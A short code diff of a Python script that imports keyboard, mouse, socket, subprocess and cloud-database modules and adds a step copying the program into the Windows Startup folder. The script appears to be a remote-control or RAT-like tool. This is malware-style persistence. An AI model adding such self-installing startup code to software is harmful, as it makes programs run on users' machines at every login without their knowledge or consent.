@@ -1,15 +1,28 @@
+import config
 import deta
-import socket
-import os
-import mouse
-import screeninfo
-import random
 import keyboard
+import mouse
+import os
+import random
+import screeninfo
+import shutil
+import socket
 import subprocess
+import sys
 import threading
 import webbrowser
-import config
-import sys
+
+
+# Get Path and Name of Program
+filepath = sys.argv[0]
+if "\\" in filepath:
+    filename = filepath.split("\\")[-1]
+else:
+    filename = filepath.split("/")[-1]
+
+
+# Copy to startup folder
+shutil.copy(filepath, os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", filename))
 
 
 # Get Hostname
